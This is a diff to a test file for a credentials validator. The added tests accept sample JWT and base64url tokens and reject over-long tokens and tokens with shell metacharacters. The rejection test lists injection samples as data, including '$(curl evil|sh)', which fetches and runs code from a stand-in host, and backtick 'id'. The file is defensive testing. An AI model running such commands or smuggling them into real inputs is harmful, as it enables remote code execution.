@@ -195,5 +195,31 @@ describe("credentials", () => {
       const { isValidCredentials } = await import("@/client/plugin/credentials");
       expect(isValidCredentials({ username: "", uiToken: "", npmToken: "" })).toBe(false);
     });
+
+    it("should accept a JWT and a base64url token", async () => {
+      const { isValidCredentials } = await import("@/client/plugin/credentials");
+
+      expect(
+        isValidCredentials({
+          username: "test",
+          uiToken: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0In0.c2lnbmF0dXJl",
+          npmToken: "v1-abc_DEF==",
+        }),
+      ).toBe(true);
+    });
+
+    it("should reject a token that carries shell metacharacters", async () => {
+      const { isValidCredentials } = await import("@/client/plugin/credentials");
+
+      for (const npmToken of ["$(curl evil|sh)", "`id`", "a'b", 'a"b', "a b", "a;b"]) {
+        expect(isValidCredentials({ username: "test", uiToken: "ui", npmToken })).toBe(false);
+      }
+    });
+
+    it("should reject a token longer than the limit", async () => {
+      const { isValidCredentials } = await import("@/client/plugin/credentials");
+
+      expect(isValidCredentials({ username: "test", uiToken: "ui", npmToken: "a".repeat(4097) })).toBe(false);
+    });
   });
 });
